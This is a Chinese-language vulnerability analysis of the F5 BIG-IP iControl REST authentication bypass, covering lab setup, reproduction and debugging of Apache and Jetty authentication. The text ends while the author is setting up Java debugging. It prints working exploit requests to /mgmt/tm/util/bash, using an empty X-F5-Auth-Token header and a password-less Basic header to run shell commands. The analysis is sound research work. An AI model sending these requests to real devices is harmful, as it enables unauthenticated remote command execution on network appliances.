## 概述
[官方信息](https://support.f5.com/csp/article/K03009991)
影响范围：
Product | Branch | Versions known to be vulnerable | Fixes introduced in |
Severity | CVSSv3 score1 | Vulnerable component or feature  
---|---|---|---|---|---|---  
BIG-IP (LTM, AAM, Advanced WAF, AFM, Analytics, APM, ASM, DDHD, DNS, FPS, GTM,
Link Controller, PEM, SSLO) | 16.x | 16.0.0 - 16.0.1 | 16.1.0 16.0.1.1* |
Critical |
[9.8](https://first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
| iControl REST API  
15.x | 15.1.0 - 15.1.2 | 15.1.2.1 |  |  |  |  
14.x | 14.1.0 - 14.1.3 | 14.1.4* |  |  |  |  
13.x | 13.1.0 - 13.1.3 | 13.1.3.6 |  |  |  |  
12.x | 12.1.0 - 12.1.5 | 12.1.5.3** |  |  |  |  
11.x | None | Not applicable |  |  |  |  
BIG-IQ Centralized Management | 8.x | None | 8.0.0 | Critical |
[9.8](https://first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
| iControl REST API  
7.x | 7.1.0 7.0.0 | 7.1.0.3 7.0.0.2 |  |  |  |  
6.x | 6.0.0 - 6.1.0 | None |  |  |  |  
F5OS | 1.x | None | Not applicable | Not vulnerable | None | None  
Traffix SDC | 5.x | None | Not applicable | Not vulnerable | None | None  
作为java菜鸟，借此框架加深对java的理解以及各种分析手段的学习，推荐同样作为java新手的人可以看一看，大佬可以直接跳过
## 环境搭建
在[F5下载网站](https://downloads.f5.com/)注册后可成功下载虚拟机版的镜像文件，我这里下载了16.0.0版本的虚拟机ovf，使用vmware可以直接导入
注意在注册账户的时候在国家选择的时候不要瞎选，我开始选了一个不知名的国家，在下载时候报错说软件禁运，不让下载，折腾了半天重新注册了一个账号才搞定。
官网提供[F5 rest
api说明文档](https://cdn.f5.com/websites/devcentral.f5.com/downloads/icontrol-rest-api-user-guide-14-1-0.pdf)
正常的访问web界面的诸多功能的话还需要一个有效的license key，但是这里为了调试漏洞不是很必须，所以省了这个步骤。
vmware导入ovf文件后会要求输入口令密码，默认是root/default,输入后会要求更改默认口令
进入后输入config可以更改虚拟机ip，我将虚拟机的ip更改为了172.16.113.247
打开web界面
## 漏洞复现
默认发送，会报401, Server为Apache
给一个错误的Authorization认证头(为admin:的base64值)，依然会报401, Server为Apache
去掉Authorization认证头，加一个X-F5-Auth-Token认证头，依然报401，但是此时Server为Jetty
然而，当两个头都存在的时候，认证会绕过并执行命令：
通过这几个包的测试我们可以得出结论，当存在X-F5-Auth-Token头时，apache不检查basic认证头，jetty在检查时，只检查Authorization的用户名不检查密码，但是为什么会这样呢，尝试分析
## 分析
### apache认证绕过漏洞分析
简单分析可以知道443是httpd开启的，其使用了apache 2.4.6框架
    [root@localhost:NO LICENSE:Standalone] ~ # netstat -antp | grep :443
    tcp6       0      0 :::443                  :::*                    LISTEN      4795/httpd
    [root@localhost:NO LICENSE:Standalone] ~ # httpd -v
    Server version: BIG-IP 67.el7.centos.5.0.0.12 (customized Apache/2.4.6) (CentOS)
    Server built:   Jun 23 2020 16:37:41
进入httpd配置目录/etc/httpd/
    [root@localhost:NO LICENSE:Standalone] httpd # cd /etc/httpd/
    [root@localhost:NO LICENSE:Standalone] httpd # grep -r "/mgmt" ./*
    Binary file ./modules/mod_f5_auth_cookie.so matches
    Binary file ./modules/mod_auth_pam.so matches
    ./run/config/httpd.conf:
    ./run/config/httpd.conf:RewriteRule ^/mgmt$ /mgmt/ [PT]
    ./run/config/httpd.conf:RewriteRule ^/mgmt(/vmchannel/.*) $1 [PT]
    ./run/config/httpd.conf:ProxyPass /mgmt/rpm !
    ./run/config/httpd.conf:ProxyPass /mgmt/job !
    ./run/config/httpd.conf:ProxyPass /mgmt/endpoint !
    ./run/config/httpd.conf:ProxyPass /mgmt/ http://localhost:8100/mgmt/ retry=0
    ./run/config/httpd.conf:ProxyPassReverse /mgmt/ http://localhost:8100/mgmt/
    ./run/udev/data/n6:E:SYSTEMD_ALIAS=/sys/subsystem/net/devices/mgmt
打开https.conf，找到以下相关部分：
        # Access is restricted to traffic from 127.0.0.1
        Require ip 127.0.0.1
        Require ip 127.4.2.2
        # This is an exact copy of the authentication settings of the document root.
        # If a connection is attempted from anywhere but 127.*.*.*, then it will have
        # to be authenticated.
        # we control basic auth via this file...
        IncludeOptional /etc/httpd/conf/basic_auth*.conf
        AuthName "Enterprise Manager"
        AuthPAM_Enabled on
        AuthPAM_ExpiredPasswordsSupport on
        require valid-user
    RewriteEngine on
    RewriteRule ^/mgmt$ /mgmt/ [PT]
    RewriteRule ^/mgmt(/vmchannel/.*) $1 [PT]
    # Don't proxy REST rpm endpoint requests.
    ProxyPass /mgmt/rpm !
    ProxyPass /mgmt/job !
    ProxyPass /mgmt/endpoint !
    # Proxy REST service bus requests.
    # We always retry so if we restart the REST service bus, Apache
    # will quickly re-discover it. (The default is 60 seconds.)
    # If you have retry timeout > 0, Apache timers may go awry
    # when clock is reset. It may never re-enable the proxy.
    ProxyPass /vmchannel/ http://localhost:8585/vmchannel/ retry=0
    ProxyPass /mgmt/ http://localhost:8100/mgmt/ retry=0
可以了解到请求/mgmt/相关url开启了AuthPAM_Enabled，启用auth会调用/usr/lib/httpd/modules/mod_auth_pam.so判断鉴权，尝试逆向/usr/lib/httpd/modules/mod_auth_pam.so文件
> IDA中，将汇编统一解析为intel风格,mov dst source
参考[Apache Hook机制解析（上）——钩子机制的实现](http://www.javashuo.com/article/p-cqvtyvsi-cq.html)apache的mod都是通过钩子实现的，逆向mod_auth_pam.so发现
    int pam_register_hooks()
    {
      ap_hook_check_authz(sub_5AF0, 0, 0, 20, 1);
      return ap_hook_check_access_ex(sub_5AF0, 0, 0, 20, 1);
    }
认证检查的具体代码都在sub_5AF0当中
这个函数很大，而且由于不知名原因不能反编译拿到伪代码，但是可以找到"X-F5-Auth-Token"的调用：
由于代码量较大，看起来比较累，计划结合动态调试搞清楚逻辑，
由于apache默认的话会开启子进程来处理，调试进程这个有点麻烦，为了方便调试搞清楚apache认证绕过过程，以单线程的方式重启httpd，
    /usr/sbin/httpd -DTrafficShield -DAVRUI -DWebAccelerator -DSAM -X
通过查看指定进程号下的maps文件，即可知道mod_auth_pam.so的加载基地址
    [root@localhost:NO LICENSE:Standalone] config # cat /proc/$(ps -ef |grep "/usr/sbin/httpd -D" | grep -v "grep" | awk '{print $2}')/maps | grep mod_auth_pam.so | grep r-xp
    563aa000-563b7000 r-xp 00000000 fd:06 168436                             /usr/lib/httpd/modules/mod_auth_pam.so
在mod_auth_pam.so的loc_72D0地址处下断点，即hex(0x563aa000+0x72d0)=0x563b12d0
    (gdb) b *0x563b12d0
    Breakpoint 1 at 0x563b12d0
然后发送数据包(注意，这个数据包里面是没有X-F5-Auth-Token头的)：
    POST /mgmt/tm/util/bash HTTP/1.1
    Host: 172.16.113.247
    Authorization: Basic YWRtaW46
    Connection: close
    Content-type: application/json
    Content-Length: 41
    {"command":"run", "utilCmdArgs": "-c id"}
继续调试程序，当运行至0x563b12ee(即test eax, eax)时
    0x563b12ee in ?? () from /etc/httpd/modules/mod_auth_pam.so
    (gdb) i r $eax
    eax            0x0      0
可以看出，从头里面取出X-F5-Auth-Token返回值为0，会继续运行,获取其它参数的值
进而会使用从头Authorization中取到的值拿去loc_5f28做验证：
自然，这里是通过不了认证的，会由apache返回登陆失败
然而，如果重新发一个存在X-F5-Auth-Token头的数据包：
    POST /mgmt/tm/util/bash HTTP/1.1
    Host: 172.16.113.247
    X-F5-Auth-Token:
    Connection: close
    Content-type: application/json
    Content-Length: 41
    {"command":"run", "utilCmdArgs": "-c id"}
认证校验这里则会奇怪的绕过对其它头信息的获取及校验，直接扔给
### jetty认证绕过漏洞分析
前面已经分析清楚了，如果存在X-F5-Auth-Token则会绕过apache的认证机制，绕过之后，相关信息会被转发给local:8100来做下一步的处理，
查看一下8100是哪个程序在处理：
    [root@localhost:NO LICENSE:Standalone] conf # netstat -antp | grep :8100
    tcp        1      0 127.0.0.1:55220         127.0.0.1:8100          CLOSE_WAIT  28239/httpd
    tcp        1      0 127.0.0.1:49718         127.0.0.1:8100          CLOSE_WAIT  5406/icr_eventd
    tcp        1      0 127.0.0.1:51758         127.0.0.1:8100          CLOSE_WAIT  28255/httpd
    tcp        1      0 127.0.0.1:59548         127.0.0.1:8100          CLOSE_WAIT  28270/httpd
    tcp        1      0 127.0.0.1:43864         127.0.0.1:8100          CLOSE_WAIT  28209/httpd
    tcp        1      0 127.0.0.1:47692         127.0.0.1:8100          CLOSE_WAIT  24091/httpd
    tcp6       0      0 127.0.0.1:8100          :::*                    LISTEN      21186/java
    tcp6       0      0 127.0.0.1:8100          127.0.0.1:49718         FIN_WAIT2   21186/java
    [root@localhost:NO LICENSE:Standalone] cat /proc/21186/cmdline 
    /usr/lib/jvm/jre/bin/java
    -D java.util.logging.manager=com.f5.rest.common.RestLogManager
    -D java.util.logging.config.file=/etc/restjavad.log.conf
    -D log4j.defaultInitOverride=true
    -D org.quartz.properties=/etc/quartz.properties -Xss384k 
    -XX:+PrintFlagsFinal
    -D sun.jnu.encoding=UTF-8
    -D file.encoding=UTF-8 
    -XX:+PrintGC -Xloggc:/var/log/restjavad-gc.log 
    -XX:+UseGCLogFileRotation 
    -XX:NumberOfGCLogFiles=2 
    -XX:GCLogFileSize=1M 
    -XX:+PrintGCDateStamps 
    -XX:+PrintGCTimeStamps 
    -XX:MaxPermSize=72m -Xms96m -Xmx192m 
    -XX:-UseLargePages 
    -XX:StringTableSize=60013 
    -classpath :/usr/share/java/rest/f5.rest.adc.bigip.jar:/usr/share/java/rest/f5.rest.adc.shared.jar:/usr/share/java/rest/f5.rest.asm.jar:/usr/share/java/rest/f5.rest.icr.jar:/usr/share/java/rest/f5.rest.jar:/usr/share/java/rest/f5.rest.live-update.jar:/usr/share/java/rest/f5.rest.nsyncd.jar:/usr/share/java/rest/libs/axis-1.1.jar:/usr/share/java/rest/libs/bcpkix-1.59.jar:/usr/share/java/rest/libs/bcprov-1.59.jar:/usr/share/java/rest/libs/cal10n-api-0.7.4.jar:/usr/share/java/rest/libs/commonj.sdo-2.1.1.jar:/usr/share/java/rest/libs/commons-codec.jar:/usr/share/java/rest/libs/commons-discovery.jar:/usr/share/java/rest/libs/commons-exec-1.3.jar:/usr/share/java/rest/libs/commons-io-1.4.jar:/usr/share/java/rest/libs/commons-lang.jar:/usr/share/java/rest/libs/commons-lang3-3.2.1.jar:/usr/share/java/rest/libs/commons-logging.jar:/usr/share/java/rest/libs/concurrent-trees-2.5.0.jar:/usr/share/java/rest/libs/core4j-0.5.jar:/usr/share/java/rest/libs/eclipselink-2.4.2.jar:/usr/share/java/rest/libs/f5.asmconfig.jar:/usr/share/java/rest/libs/f5.rest.mcp.mcpj.jar:/usr/share/java/rest/libs/f5.rest.mcp.schema.jar:/usr/share/java/rest/libs/f5.soap.licensing.jar:/usr/share/java/rest/libs/federation.jar:/usr/share/java/rest/libs/gson-2.8.2.jar:/usr/share/java/rest/libs/guava-20.0.jar:/usr/share/java/rest/libs/httpasyncclient.jar:/usr/share/java/rest/libs/httpclient.jar:/usr/share/java/rest/libs/httpcore-nio.jar:/usr/share/java/rest/libs/httpcore.jar:/usr/share/java/rest/libs/httpmime.jar:/usr/share/java/rest/libs/icrd-src.jar:/usr/share/java/rest/libs/icrd.jar:/usr/share/java/rest/libs/jackson-annotations-2.9.5.jar:/usr/share/java/rest/libs/jackson-core-2.9.5.jar:/usr/share/java/rest/libs/jackson-databind-2.9.5.jar:/usr/share/java/rest/libs/jackson-dataformat-yaml-2.9.5.jar:/usr/share/java/rest/libs/javax.persistence-2.1.1.jar:/usr/share/java/rest/libs/javax.servlet-api.jar:/usr/share/java/rest/libs/jaxrpc-1.1.jar:/usr/share/java/rest/libs/jetty-all.jar:/usr/share/java/rest/libs/joda-time-2.9.9.jar:/usr/share/java/rest/libs/jsch-0.1.53.jar:/usr/share/java/rest/libs/json_simple.jar:/usr/share/java/rest/libs/jsr311-api-1.1.1.jar:/usr/share/java/rest/libs/libthrift.jar:/usr/share/java/rest/libs/log4j.jar:/usr/share/java/rest/libs/lucene-analyzers-common-4.10.4.jar:/usr/share/java/rest/libs/lucene-core-4.10.4.jar:/usr/share/java/rest/libs/lucene-facet-4.10.4.jar:/usr/share/java/rest/libs/odata4j-0.7.0-core.jar:/usr/share/java/rest/libs/quartz-2.2.1.jar:/usr/share/java/rest/libs/slf4j-api.jar:/usr/share/java/rest/libs/slf4j-ext-1.6.3.jar:/usr/share/java/rest/libs/slf4j-log4j12.jar:/usr/share/java/rest/libs/snakeyaml-1.18.jar:/usr/share/java/rest/libs/swagger-annotations-1.5.19.jar:/usr/share/java/rest/libs/swagger-core-1.5.19.jar:/usr/share/java/rest/libs/swagger-models-1.5.19.jar:/usr/share/java/rest/libs/swagger-parser-1.0.35.jar:/usr/share/java/rest/libs/validation-api-1.1.0.Final.jar:/usr/share/java/rest/libs/wsdl4j-1.1.jar:/usr/share/java/f5-avr-reporter-api.jar com.f5.rest.workers.RestWorkerHost 
    --port=8100 
    --outboundConnectionTimeoutSeconds=60 
    --icrdConnectionTimeoutSeconds=60 
    --workerJarDirectory=/usr/share/java/rest 
    --configIndexDirectory=/var/config/rest/index 
    --storageDirectory=/var/config/rest/storage 
    --storageConfFile=/etc/rest.storage.BIG-IP.conf 
    --restPropertiesFiles=/etc/rest.common.properties,/etc/rest.BIG-IP.properties 
    --machineId=ff716f6f-1be0-4de5-8ca8-17beb749e271
我看到基本都是/usr/share/java/rest/这个目录下的jar包，所以偷个懒，把/usr/share/java/rest/目录下的所有jar包反编译
由漏洞复现中的数据包我们可以大概猜测，X-F5-Auth-Token绕过了apache认证，那Authorization: Basic
YWRtaW46应该绕过了java这里的认证，由于在Authorization这里我们只是放了admin:的base64的值，所以猜测java这里并没有去真正的校验密码，只是检查了一下用户名，所以在看java时候，我们也可以有挑选的去找我们的切入点，从Authorization开始下手
动态调试：
通过以下方式可以得知进程运行目录为 `/var/service/restjavad`
    [root@localhost:NO LICENSE:Standalone] config # ls -al /proc/21186/
    total 0
    dr-xr-xr-x.   9 root root 0 May 16 08:17 .
    dr-xr-xr-x. 300 root root 0 May 16 07:23 ..
    dr-xr-xr-x.   2 root root 0 May 16 16:51 attr
    -rw-r--r--.   1 root root 0 May 16 16:51 autogroup
    -r--------.   1 root root 0 May 16 16:51 auxv
    -r--r--r--.   1 root root 0 May 16 16:51 cgroup
    --w-------.   1 root root 0 May 16 16:51 clear_refs
    -r--r--r--.   1 root root 0 May 16 09:05 cmdline
    -rw-r--r--.   1 root root 0 May 16 16:51 comm
    -rw-r--r--.   1 root root 0 May 16 16:51 coredump_filter
    -r--r--r--.   1 root root 0 May 16 16:51 cpuset
    lrwxrwxrwx.   1 root root 0 May 16 16:51 cwd -> /var/service/restjavad
    -r--------.   1 root root 0 May 16 16:51 environ
    lrwxrwxrwx.   1 root root 0 May 16 16:51 exe -> /usr/java/java-1.7.0-openjdk/jre-abrt/bin/java
    dr-x------.   2 root root 0 May 16 16:51 fd
    dr-x------.   2 root root 0 May 16 16:51 fdinfo
    -rw-r--r--.   1 root root 0 May 16 16:51 gid_map
    -r--------.   1 root root 0 May 16 16:51 io
    -r--r--r--.   1 root root 0 May 16 16:51 limits
    -rw-r--r--.   1 root root 0 May 16 16:51 loginuid
    dr-x------.   2 root root 0 May 16 16:51 map_files
    -r--r--r--.   1 root root 0 May 16 16:51 maps
    -rw-------.   1 root root 0 May 16 16:51 mem
    -r--r--r--.   1 root root 0 May 16 16:51 mountinfo
    -r--r--r--.   1 root root 0 May 16 16:51 mounts
    -r--------.   1 root root 0 May 16 16:51 mountstats
    dr-xr-xr-x.   6 root root 0 May 16 16:51 net
    dr-x--x--x.   2 root root 0 May 16 16:51 ns
    -r--r--r--.   1 root root 0 May 16 16:51 numa_maps
    -rw-r--r--.   1 root root 0 May 16 16:51 oom_adj
    -r--r--r--.   1 root root 0 May 16 16:51 oom_score
    -rw-r--r--.   1 root root 0 May 16 16:51 oom_score_adj
    -r--r--r--.   1 root root 0 May 16 16:51 pagemap
    -r--r--r--.   1 root root 0 May 16 16:51 personality
    -rw-r--r--.   1 root root 0 May 16 16:51 projid_map
    lrwxrwxrwx.   1 root root 0 May 16 16:51 root -> /
    -rw-r--r--.   1 root root 0 May 16 16:51 sched
    -r--r--r--.   1 root root 0 May 16 16:51 schedstat
    -r--r--r--.   1 root root 0 May 16 16:51 sessionid
    -rw-r--r--.   1 root root 0 May 16 16:51 setgroups
    -r--r--r--.   1 root root 0 May 16 16:51 smaps
    -r--r--r--.   1 root root 0 May 16 16:51 stack
    -r--r--r--.   1 root root 0 May 16 09:04 stat
    -r--r--r--.   1 root root 0 May 16 09:04 statm
    -r--r--r--.   1 root root 0 May 16 09:03 status
    -r--r--r--.   1 root root 0 May 16 16:51 syscall
    dr-xr-xr-x.  43 root root 0 May 16 16:51 task
    -r--r--r--.   1 root root 0 May 16 16:51 timers
    -rw-r--r--.   1 root root 0 May 16 16:51 uid_map
    -r--r--r--.   1 root root 0 May 16 16:51 wchan
    [root@localhost:NO LICENSE:Standalone] restjavad # ls -al /var/service/restjavad
    total 20
    drwxr-xr-x.   5 root root 4096 May 16 07:24 .
    drwxr-xr-x. 107 root root 4096 Jun 23  2020 ..
    drwxr-xr-x.   2 root root 4096 Jun 23  2020 deps
    drwxr-xr-x.   2 root root 4096 Jun 23  2020 requires
    lrwxrwxrwx.   1 root root   31 Jun 23  2020 run -> /etc/bigstart/scripts/restjavad
    drwx------.   2 root root 4096 May 16 07:27 supervise
修改run文件，即/etc/bigstart/scripts/restjavad,增加一行
    JVM_OPTIONS+=" -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8777"